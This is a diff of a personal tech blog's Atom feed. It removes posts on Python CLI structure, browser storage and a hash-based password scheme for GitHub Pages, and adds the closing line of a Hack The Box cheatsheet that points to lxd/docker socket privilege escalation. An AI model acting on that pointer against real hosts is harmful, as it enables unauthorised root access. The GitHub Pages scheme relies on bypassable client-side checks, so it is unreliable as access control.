-├── setup.py
-└── tests
-    ├── __init__.py
-    └── commands
-        ├── __init__.py
-        ├── test_bye.py
-        ├── test_hello.py
-        └── test_options.py
-```
-
-Let&apos;s list the most important stuff:
-
-- Makefile: contains a series of instructions on how to perform common tasks: clean, test, lint, coverage and building locally
-- examplecli: main module of the application. Contains all the application code organized as well in sub-modules.
-- README.md: Readme file that contains some documentation and help materials
-- requirements.txt: the pip libraries the app needs to be able to execute
-- requirements_test.txt: the pip libraries to run the app tests
-- scripts: useful tools for local development
-- setup.py: we&apos;ll discuss in a following section about this file
-- tests: folder that contains the tests for the app
-
-## Virtual environment and dependencies
-
-In order to have a clean environment, it is very recommended to use virtual environments. This fancy feature will isolate the dependencies needed for every application.
-
-In order to boostrap the virtual environment, you should create it (if not created) and activate it:
-
-```
-python -m venv .venv
-source .venv/bin/activate
-```
-
-Once the virtual environemnt is setup, you can install the dependencies in:
-
-```
-pip install -r requirements.txt
-pip install -r requirements_test.txt
-```
-
-This will store the dependencies under the `.venv` folder
-
-## Python modules
-
-You should organise the python source code around the idea of modules. Modules are basically a folder with an empty file named `__init__.py` and the source code.
-
-*it is very important to add the .py extension, otherwise it&apos;s not recognized as a module*
-
-Different parts of the application can import the modules, e.g.:
-
-```python
-import click
-
-from examplecli.common.logging import debug, info
-from examplecli.commands.options import verbose_option, user_option_required
-
-
-@click.group()
-def hello_source():
-    pass
-
-
-@hello_source.command()
-@verbose_option
-@user_option_required
-def hello(**opts):
-    user_name = opts[&quot;user&quot;]
-    say_hello(user_name)
-
-
-def say_hello(user_name):
-    debug(f&quot;Saying hello to {user_name}&quot;)
-    info(f&quot;Hello {user_name}&quot;)
-```
-This file is importing the methods `debug` and `info` from `logging` file in module `examplecli.common`
-
-## setup.py
-
-This file is only needed if we want to package the application. Without it, we are still able to run the application by calling the entrypoint:
-
-```bash
-python3 examplecli/entrypoint.py      
-Usage: entrypoint.py [OPTIONS] COMMAND [ARGS]...
-
-  Welcome to Example CLI!
-
-Options:
-  --help  Show this message and exit.
-
-Commands:
-  bye
-  hello
-```
-
-However, for this application, we want to package it into a wheel file and install it with `pipx`. In order to do that, we need the setup.py file. Let&apos;s see what&apos;s inside of this file:
-
-```python
-#!/usr/bin/env python
-
-from setuptools import setup, find_packages
-from os import environ
-
-# reads the requirements and stores them into a variable
-with open(&apos;requirements.txt&apos;) as fp:
-    install_requires = fp.read()
-
-# reads the test requirements and stores them into a variable
-with open(&apos;requirements_test.txt&apos;) as fp:
-    tests_require = fp.read()
-
-setup(name=&apos;example-cli&apos;, # name of the package
-      version=environ.get(&apos;EXAMPLE_CLI_VERSION&apos;, &apos;0.0.1&apos;), # reads the variable from a environment variable
-      description=&apos;Example CLI&apos;, # provides a description of the package
-      author=&apos;Adrian Galera&apos;, # provides the author of the package
-      author_email=&apos;&apos;,
-      python_requires=&apos;&gt;=3.6.*&apos;, # details the version compatibility.
-      packages=find_packages(), # the find_packages method scans the folder for modules and sub-modules
-      install_requires=install_requires,
-      tests_require=tests_require,
-      entry_points={
-          &apos;console_scripts&apos;: [
-              &apos;example-cli = examplecli.entrypoint:start&apos;, # required for click framework to find the starting point
-          ]
-      }
-      )
-```
-
-In order to generate the wheel file, the user should run the following command:
-
-```bash
-EXAMPLE_CLI_VERSION=$VERSION python3 setup.py sdist bdist_wheel
-```</content><author><name></name></author><category term="python" /><category term="architecture" /><category term="cli" /><category term="python" /><category term="architecture" /><category term="cli" /><summary type="html">Recently I was starting a Python application project from scratch and I had some issues understanding the correct project structure. Here’s what I have learnt.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-app-structure/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-app-structure/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Python cli application</title><link href="https://www.agalera.eu/python-cli-application/" rel="alternate" type="text/html" title="Python cli application" /><published>2022-12-13T00:00:00+01:00</published><updated>2022-12-13T00:00:00+01:00</updated><id>https://www.agalera.eu/python-cli-application</id><content type="html" xml:base="https://www.agalera.eu/python-cli-application/">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-Since I want to create a nice CLI tool, I search some libraries and found the click library: &lt;a href=&quot;https://pypi.org/project/click/&quot;&gt;https://pypi.org/project/click/&lt;/a&gt;. 
-
-This tool allows the developer to create a beatiful CLI interaction with minimal code.
-
-Each operation you can perform with the application is called Command. In thise case we want to perform two operations: `hello` and `bye`, so we&apos;ll create two commands for that.
-
-To define a command, we need to do two things:
-- Create the source and annotate it with `@click.group()`:
-
-```python
-@click.group()
-def bye_source():
-    pass
-```
-
-- Create the command method and annotate it with the source created before
-
-```python
-@bye_source.command()
-@user_option_required
-@verbose_option
-def bye(**opts):
-    user_name = opts[&quot;user&quot;]
-    say_bye(user_name)
-
-
-def say_bye(user_name):
-    debug(f&quot;Saying bye to {user_name}&quot;)
-    info(f&quot;Bye {user_name}&quot;)
-```
-
-I decide to separate the `bye` in two methods because this way testing the actual logic is way easier. If we have it only in the `bye`, we need to use the `click` library in testing as well.
-
-Once we have created the commands, we must define an entrypoint which imports them and setup click library:
-
-```python
-import click
-from examplecli.commands.hello import hello_source
-from examplecli.commands.bye import bye_source
-
-WELCOME_MESSAGE = &quot;&quot;&quot;
-Welcome to Example CLI!
-&quot;&quot;&quot;
-
-def start():
-    cli = click.CommandCollection(
-        sources=[hello_source, bye_source], help=WELCOME_MESSAGE)
-    cli()
-
-
-if __name__ == &apos;__main__&apos;:
-    start()
-```
-
-Now we can run the program directly from the console:
-
-```bash
-python3 examplecli/entrypoint.py      
-Usage: entrypoint.py [OPTIONS] COMMAND [ARGS]...
-
-  Welcome to Example CLI!
-
-Options:
-  --help  Show this message and exit.
-
-Commands:
-  bye
-  hello
-```
-
-If we want to package the application, we need to do one more thing. In the `setup.py` file we must specify the console entrypoiny:
-
-```python
-#!/usr/bin/env python
-
-from setuptools import setup, find_packages
-from os import environ
-
-with open(&apos;requirements.txt&apos;) as fp:
-    install_requires = fp.read()
-
-with open(&apos;requirements_test.txt&apos;) as fp:
-    tests_require = fp.read()
-
-setup(name=&apos;example-cli&apos;,
-      version=environ.get(&apos;EXAMPLE_CLI_VERSION&apos;, &apos;0.0.1&apos;),
-      description=&apos;Example CLI&apos;,
-      author=&apos;Adrian Galera&apos;,
-      author_email=&apos;&apos;,
-      python_requires=&apos;&gt;=3.6.*&apos;,
-      packages=find_packages(),
-      install_requires=install_requires,
-      tests_require=tests_require,
-      entry_points={
-          &apos;console_scripts&apos;: [
-              &apos;example-cli = examplecli.entrypoint:start&apos;,
-          ]
-      }
-      )
-```
-
-Now we can build the app and install it using pipx:
-
-```bash
-EXAMPLE_CLI_VERSION=$VERSION python3 setup.py sdist bdist_wheel
-pipx install dist/example_cli-0.0.1+local*-py3-none-any.whl --force
-```
-
-pipx will create the binary cli tool. Now we can run it as a standalone application:
-
-```bash
-example-cli hello --user test
-2022-12-13T15:40:23.029Z | Hello test
-```</content><author><name></name></author><category term="python" /><category term="cli" /><category term="click" /><category term="python" /><category term="cli" /><category term="click" /><summary type="html">I have been developing an Python application to be able to be run as a CLI tool. In this article I speak about how I implement that using click library.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/python-cli-app/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Password protection for Github Pages</title><link href="https://www.agalera.eu/github-pages-password/" rel="alternate" type="text/html" title="Password protection for Github Pages" /><published>2022-09-06T00:00:00+02:00</published><updated>2022-09-06T00:00:00+02:00</updated><id>https://www.agalera.eu/github-pages-password</id><content type="html" xml:base="https://www.agalera.eu/github-pages-password/">In this article I implement a workaround to protect with password a static page stored in Github pages.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-I am using Github Pages to store static pages without any backend. That&apos;s super nice, but now I need to serve a password protected page. What kind I do?
-
-I have found a guy that asked the same question and have a nice proposal: &lt;b&gt;use hashes&lt;/b&gt;. You can find his code here: &lt;a href=&quot;https://github.com/chrissy-dev/protected-github-pages&quot;&gt;https://github.com/chrissy-dev/protected-github-pages&lt;/a&gt;. His solution is older than walking.
-
-## Hash to the rescue
-
-The workaround is really simple, you choose a password that can be hard to guess. Hint: use some page that computes the password strength like: &lt;a href=&quot;https://www.idstrong.com/tools/password-strength-checker/&quot;&gt;https://www.idstrong.com/tools/password-strength-checker/&lt;/a&gt;.
-
-With that word, you generate the sha1 hash:
-
-```
-echo -n &quot;&lt;your-word&gt;&quot; | openssl sha1
-cb1dc474e185777dad218b7d60f2781723d8190b
-```
-
-Now generate a folder with that text in the root of the repo and place all the password protected content there.
-
-Then in the root of the repository place an index.html that will have a password form. 
-
-When the user enters the password, compute the sha1 hash of the field they just enter. Then, perform a redirection to the URL, if the answer is different than 200, the folder has not been found, so the password is invalid.
-
-That&apos;s the code that does the magic:
-
-```javascript
-function login(secret) {
-            var hash = sha1(secret)
-            var url = hash + &quot;/index.html&quot;
-            var alert = document.querySelectorAll(&apos;[data-id=&quot;alert&quot;]&apos;)
-
-            var request = new XMLHttpRequest()
-            request.open(&apos;GET&apos;, url, true)
-
-            request.onload = function () {
-                if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) {
-                    window.location = url
-                } else {
-                    parent.location.hash = hash
-                    alert[0].style.display = &apos;block&apos;
-                    password[0].setAttribute(&apos;placeholder&apos;, &apos;Incorrect password&apos;)
-                    password[0].value = &apos;&apos;
-                }
-            }
-            request.onerror = function () {
-                parent.location.hash = hash
-                alert[0].style.display = &apos;block&apos;
-                password[0].setAttribute(&apos;placeholder&apos;, &apos;Incorrect password&apos;)
-                password[0].value = &apos;&apos;
-            }
-            request.send()
-        }
-
-button[0].addEventListener(&quot;click&quot;, function () {
-    login(password[0].value)
-})
-```
-That works really nice, however, once the authentication is passed, a user can share the link and the authentication will be bypassed. We need an extra layer of security
-
-## Avoid sharing the link
-
-You can make a very easy implementation to make short-lived links. The page that provides the autentication can add a `not-valid-after` parameter to the URL. For example:
-
-```javascript
-request.onload = function () {
-        if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) {
-            let nva = new Date().getTime() + 1_000
-            window.location = url + &quot;?nva=&quot;+nva
-...
-```
-With this piece of code, the links are only valid for 1 second.
-
-In the index.html of the protected content, we only need to check for the `not-valid-after` parameter:
-
-```javascript
-let paramString = window.location.search.split(&apos;?&apos;)[1];
-let queryString = new URLSearchParams(paramString);
-let nva = parseInt(queryString.get(&quot;nva&quot;))
-let now = new Date().getTime()
-if (Number.isNaN(nva) || now &gt; nva) {
-    console.log(&quot;not-valid-after invalid, going to redirect to /&quot;)
-    window.location = &quot;/&quot;
-}
-```
-This piece of the code reads the `nva` parameter from the URL and checks if it&apos;s not present or if it&apos;s too late. In any of those cases, it redirects to the root; where the password form appears.
-
-At the end you should end up with a file structure similar to:
-```
-├── CNAME
-├── f2daa.... (hash)
-│   ├── css
-│   │   ├── style.css
-│   │   └── style.css.map
-│   ├── fonts
-│   │   ├── flaticon.css
-│   │   ├── Flaticon.eot
-│   │   ├── Flaticon.svg
-│   │   ├── Flaticon.ttf
-│   │   ├── Flaticon.woff
-│   ├── images
-│   │   ├── blog
-│   │   │   ├── img-1.jpg
-│   │   │   ├── img-2.jpg
-│   │   │   └── img-3.jpg
-│   ├── index.html (html protected under password)
-│   ├── js
-│   │   ├── bootstrap.min.js
-│   │   ├── script.js
-│   ├── README.md
-└── index.html (html acting as a login page)
-```</content><author><name></name></author><category term="javascript" /><category term="browser" /><category term="github-pages" /><category term="security" /><category term="javascript" /><category term="browser" /><category term="github-pages" /><category term="security" /><summary type="html">In this article I implement a workaround to protect with password a static page stored in Github pages.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/github-password/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/github-password/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Browser storage</title><link href="https://www.agalera.eu/browser-storage/" rel="alternate" type="text/html" title="Browser storage" /><published>2022-07-23T00:00:00+02:00</published><updated>2022-07-23T00:00:00+02:00</updated><id>https://www.agalera.eu/browser-storage</id><content type="html" xml:base="https://www.agalera.eu/browser-storage/">In this article I discuss some techniques to store data in the browser. This way the web applications do not require a expensive backend, every customer stores its information in the browser.
-
-&lt;p&gt;&lt;!--more--&gt;&lt;/p&gt;
-
-This is part of my series of articles about leaflet:
-
-- &lt;a href=&quot;/leaflet-fog-of-war&quot;&gt;Leaflet fog of war&lt;/a&gt;
-- &lt;a href=&quot;/leaflet-draw-polygon-markers&quot;&gt;Draw a polygon from markers in leaflet&lt;/a&gt;
-- &lt;a href=&quot;/leaflet-load-gpx&quot;&gt;Load and display GPX in leaflet&lt;/a&gt;
-- &lt;a href=&quot;/browser-storage&quot;&gt;Browser storage&lt;/a&gt;
-
-For the implementation of fog of war map, I do not want to spend any time dealing with the backend. Besides that, I don&apos;t want to spent not even a cent on the storage of data.
-
-In this scenario, the visited areas are stored into a huge GeoJSON document. The persistence should store that document so the user does not need to re-create it every time.
-
-However, how the can the data be persisted without any backend? It turns out the browser offers some persistence capabilities, let&apos;s analyse them.
-
-## Local storage
-
-The first approach is to use browser&apos;s local storage. This storage is a key-value storage which has a very simple synchronous contract:
-
-```javascript
-window.localStorage.setItem(&quot;a&quot;,&quot;b&quot;)
-window.localStorage
-&gt; Storage {a: &apos;b&apos;, length: 1}
-window.localStorage.getItem(&quot;a&quot;)
-&gt; &apos;b&apos;
-```
-
-This storage is really simple and easy to use, however it comes at the cost of have a very limited space in the order of few MBs.
-
-The original approach was to use this type of storage, however I reached the size limit really fast when I started to import GPX files.
-
-## Caches
-
-Reading a little bit more on browser storage capabilities, I discovered the caching mechanism. This is designed to store the answers from HTTP calls, hence its name. However, its original purpose can be violated to store any kind of data, not only HTTP responses.
-
-This new API is asynchronous, that make the transition from local storage to caches a little bit painful, but it&apos;s a price we have to pay for having a massive amount of storage capability. According to &lt;a href=&quot;https://web.dev/cache-api-quick-guide/&quot;&gt;this article&lt;/a&gt; the storage availability is based on the amount of storage available on the disk.
-
-```javascript
-function GeoJsonStorage() {
-    const CACHE_NAME = &quot;geojson&quot;
-    const CACHE_KEY = &quot;https://xxxx/geojson.json&quot;
-    return {
-        set: function (geojson) {
-            caches.open(CACHE_NAME)
-                .then(function (cache) {
-                    cache.put(CACHE_KEY, new Response(JSON.stringify(geojson)));
-                })
-                .catch(err =&gt; console.log(`Cannot open the cache, error: ${err}`))
-        },
-
-        get: async function () {
-            return caches.open(CACHE_NAME)
-                .then(cache =&gt; cache.match(CACHE_KEY))
-                .then(response =&gt; {
-                    if (response)
-                        return response.json()
-                    return undefined
-                })
-                .catch(err =&gt; console.log(`Cannot get the contents from the cache, error: ${err}`))
-        },
-        clear: function () {
-            caches.delete(CACHE_NAME)
-        }
-    }
-}
-```
-The key to store arbitrary data into the caches mechanism is to trick the system saying that the cache key is an HTTP request: `https://xxxx/geojson.json`. This way, you can put and retrieve a JSON inside the caching mechanism</content><author><name></name></author><category term="javascript" /><category term="browser" /><category term="persistence" /><category term="javascript" /><category term="browser" /><category term="persistence" /><summary type="html">In this article I discuss some techniques to store data in the browser. This way the web applications do not require a expensive backend, every customer stores its information in the browser.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/browser-storage/featured-image.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/browser-storage/featured-image.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p>Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html"><![CDATA[I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
